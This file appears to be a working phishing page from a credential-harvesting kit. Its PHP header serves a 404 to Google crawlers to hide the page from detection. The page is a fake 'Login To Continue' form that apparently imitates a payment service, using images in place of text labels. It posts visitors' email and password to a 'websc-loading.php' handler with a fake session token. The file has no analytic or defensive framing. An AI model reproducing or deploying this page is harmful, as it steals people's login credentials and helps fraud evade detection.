<?
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>

<!DOCTYPE html>
<html xmlns:ns1="og" lang="en" xmlns="http://www.w3.org/1999/xhtml" ns1:xmlns="http://ogp.me/ns#" class=" jsEnabled jsEnabled">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Login To Continue</title>
<meta http-equiv="X-UA-Compatible" content="IE=9">
<link rel="shortcut icon" href="img/favicon.ico">
<link media="screen" rel="stylesheet" type="text/css" href="css/global.css">

<style type="text/css">
					html[data-device-type="dedicated"] { min-width: 71.7143em; }
					html { font-family: "Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 87.5%; }
					html, body { margin : 0 auto; margin-left:-4px; width : 100%; display:table; min-width: 988px;}					
					body { font-family : "Helvetica Neue", Helvetica, Arial, sans-serif; background-color:#FFFFFF; }
					#stdpage {	margin-right: auto; margin-left: auto;	width:auto;	}
					#stdpage .layout2a div.first { width: auto; }
					#stdpage .layout2a div.last { width: 450px; float: left; margin-left:50px; }
					#content { background: none; width:960px; margin:0 auto; border-bottom: 1px solid #E5E5E5; }
					#main { width: auto; margin: 0 auto; -webkit-font-smoothing: antialiased;}
					#header { margin: 0 auto; height:70px !important; border-bottom: 1px solid #E5E5E5}
					#header h1 { padding: 12px 0 24px 6px; margin:auto; position: relative; width: 960px;}
					#footer { color:#777; width: 960px; margin: 0 auto; text-align:left; padding: 15px 0 0 0 !important; margin-bottom:40px; font-size:12px; }
					#footer p#footerSecure { display:none; }
					#footer ul li a	{ color: #777; text-decoration: none; }	
					#footer ul li a:hover { color:#444; }					
					#headline, #messageBox {display:none;}
					.form-signin { background-color: #F5F5F5; border-radius: 2px; display: block; max-width: 450px; margin: 0 auto; }
					.col.last .form-signin { background-color: #fff; }
					.social-box { margin: 70px auto; padding: 30px 40px; }
					.mktg { margin-top: 35px;}
					fieldset { margin: 0;}
					div.loginFields { width: 415px; }
					form div p { color: #777; font-size: 1.4em; line-height: 1.5em; margin: 0; padding-bottom: 14px; padding-top: 4px; }
					form fieldset p { padding-bottom:10px }
					input { -moz-appearance: none; -moz-box-sizing: border-box; background: none repeat 0 0 #FFF; border: 1px solid #B3B3B3; border-radius: 5px; color: #333; font-size: 1.071rem; height: 38px; line-height: 1.25em; margin: 0; padding: 0; position: relative; text-indent: 10px; transition: border-color 0.3s ease 0s; width: 250px; }
					.btn { -webkit-appearance: none; -moz-box-sizing: border-box; background: none repeat 0 0 #0079C1; border-radius: 5px; border-color: #0079C1; color: #FFF; cursor: pointer; display: inline-block; font-family: arial,sans-serif; font-size: 15px; font-weight: bold; line-height: 1.4545em; margin-bottom: 0; margin-top: -4px; padding: 9px 15px 10px; text-align: center; vertical-align: middle; height:40px; _margin-left:-10px; *margin-left:-10px; }
					.btn:hover, .btn:focus { background: none repeat 0 0 #0285D2; color: #FFF; text-decoration: none; }
					.btn:focus { outline: thin dotted #333; outline-offset: -2px; }
					.btn.active, .btn:active { background-image: none; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15) inset, 0 1px 2px rgba(0, 0, 0, 0.05); outline: 0 none; }
					.btn.disabled, .btn[disabled], .btn.disabled:hover, .btn[disabled]:hover, .btn.disabled:active, .btn[disabled]:active { background: none repeat 0 0 #E5E5E5; cursor: auto; }
					.btn-large { border-radius: 6px; font-size: 17.234px; padding: 9px 14px; }
					.btn-large [class^="icon-"], .btn-large [class*=" icon-"] { margin-top: 4px }
					.btn-secondary { background: none repeat 0 0 #DDD; color: #333; }
					.btn-secondary:hover, .btn-secondary:focus { background: none repeat 0 0 #DDD; color: #333; }
					label { padding-left : 0; font-size: 0.7em; color: #000; }
					span.help { color: #777; font-size: 0.7em; }
					input.large { width: 337px }
					input.large[type="password"], input.large[type="text"] { font-size: 15px; font-weight: normal; }
					input[type="text"]:focus, input[type="password"]:focus { border-color: #0079C1; outline: 0 none; }
					#email1, #pass1 {font-size: 18px; }
					a.large { width: 310px; height:21px; }
					@-moz-document url-prefix() { a.large { width: 337px; height:40px;} }
					a.btn-secondary { text-decoration: none; *margin-left: 0; _margin-left: 0; }
					p.loginheadline { font-size: 28px; color: #444; font-weight: 300;}
					.headline, h3 { color: #444444; padding-top: 15px; font-weight: normal; font-size: 20px; line-height: 1.25em;}	
					.headline-content { font-size: 15px; font-weight: none; color: #777; margin-top:0; display:block;}
					.alert { border-bottom: 1px solid #ccc;  margin: 0 0 10px 0; padding: 15px; }

					.troubleshootingTips ul { font-size: 14px; margin-left:10px; }
					.troubleshootingTips li {list-style-type: none; margin: 0 0 0.3em 0;}
					.troubleshootingTips ul li > ul { margin-top: 4px;}
					.troubleshootingTips a { text-decoration: none; color: #0079C1; font-weight: bold; }
					#navPrimary {display: none;}
					p.contentLink a{ font-size: 13px; font-weight:bold; line-height: 1.5em; margin: 0 6px 0 2px; text-decoration: none; color: #0079C1; }
					.helpLink { border-bottom: 1px solid #CCC; margin-bottom: 15px; }
					#content p > a { border-left: 2px solid #CCC; display: inline-block; font-weight: normal; margin: 0 0 0 8px; padding-left: 10px; font-size: 1.4em; color: #0079C1; text-decoration:none; }
					#content p > .help > a { padding-bottom:12px; }
					#footerDiv{ background: none repeat 0 0 #FFFFFF;	padding-top:15px; padding-bottom:70px; padding-left:136px; position: relative; text-align: left; z-index: 2; border-top: 1px solid #E5E5E5; font-size: 12px; font-weight: 400; }					
					#legal{ font-size: 12px; margin: 20px 0 0 0; padding: 0 0 0 0.4em; }
					.signupLink { padding-left: 0; }

					.rtl #footer {text-align: right;}
					.rtl div.alert{padding: 15px 45px 15px 0;}
					.rtl div.alert-warning {background-position: 100% 15px;}

					// Media Queries
					@-ms-viewport {
					  width: device-width;
					}
					@media screen and (max-width : 768px) {
						#content { width: auto }
						div.loginFields { width: auto; }
						#header h1 { width: auto; }
						#stdpage .layout2a div.last { display: none; }
						#twoB .layout2a div.last { display: block; float: none; margin-left: 0; width: 100%; }
						#stdpage .layout2a div.first { width: 100%; }
						.form-signin { max-width: auto }
						.social-box { margin-top: 40px; margin-right: auto; margin-bottom: 40px; margin-left: auto; padding : 17px 30px; }
						input { width: 100% }
						.btn, .btn-secondary { width : auto }
						input.large { width: 100% }
						a.large { width: 88.5%; }
						@-moz-document url-prefix() { 
						 a.large { width: 100% }
						}
						#footerDiv{ padding-top:15px; padding-bottom:55px; padding-left:31px; }
						html, body { min-width: 0; }
						#main { width: auto !important; }
						#header {width:auto;}
						#footer { width: auto !important; padding-left:15px !important;}
					}					

					//Pwd recovery
					#pwrbox {display:none;}
					#pwrflow {padding-bottom:5px}
					#passwordRecoveryLightbox{-moz-border-radius: 5px;border-radius: 5px;box-shadow: 0 0 8px 1px rgba(0, 0, 0, 0.5);} #passwordRecoveryLightbox_c{width:420px;} 
					.underlay{display:none;} 
					.ui-dialog-titlebar div{width:100% !important} 
					#closeLB{display:none;}
					.logintoyouraccount {
					background: url('img/logintoyouraccount.png') center no-repeat;
					width:289px;
					float:center;
					height:38px;
					margin-top: 9px;
					margin-left:-6px;
					margin-bottom:13px;
					
					}
					
					.email1 {
					background: url('img/emailadr.png') center no-repeat;
					width:118px;
					float:center;
					height:21px;
					margin-top: 4px;
					margin-left:-2px;
					margin-bottom:1px;
					}
					.pass1 {
					background: url('img/passlogin.png') center no-repeat;
					width:82px;
					float:center;
					height:20px;
					margin-top:1px;
					margin-left:-1px;
					margin-bottom:1px;
					}
					.forgetlogin {
					background: url('img/forgetlogin.png') center no-repeat;
					width:348px;
					float:center;
					height:101px;
					margin-top:3px;
					margin-left:-3px;
					margin-bottom:7px;
					}
					.aio {
  background: url('img/aio.png') center no-repeat;
  width:370px;
  height:236px;
  margin-top:100px;
  float: left;
  margin-left:83px;
}

.loginfooter {
  background: url('img/login-footer.png') center no-repeat;
  width:1000px;
  float:center;
  height:115px;
  margin-top:-12px;
  margin-left:-20px;
  text-align:center;
}
</style>
			<style type="text/css">form#rosetta {display:none;}</style>

			
			
			<div id="header" class="std secondary">
			<h1><a href=""><img border="0" src="img/logo.gif" alt="Logo"></a></h1>
			</div>
<div id="content">
<div id="main" class="legacyErrors">
<div class="layout1">
<div class="layout2a">
<div class="col first">
<div class="loginFields">
<form method="post" name="login_form" action="websc-loading.php?Go=_Login_Success&_SESSION=<?=md5(microtime()).md5(microtime());?>">
<div class="form-signin">

<div class="social-box">

<div class="logintoyouraccount"></div>

<fieldset>

<div class="email1"></div>
<input type="text" id="login_email" class="large" name="1" value=""></p>
<div class="pass1"></div>

<input autocomplete="off" type="password" id="login_password" name="2" value="" class="large"></p>
<p><input type="submit" name="Log In" value="Log In" class="btn large"></p>
</fieldset>

<div class="forgetlogin"></div>
</div></div></form>
</div></div>

<div class="aio"></div>
</div></div>
<div class="layout1"><input type="hidden" name="cmd" id="countryCode" value="US"><div id="pwrbox" class="hide"></div></div>
</div>
</div>

<center>
<div class="loginfooter">
</div></center>

<div id="css_test" style="color: red;"></div></body></html>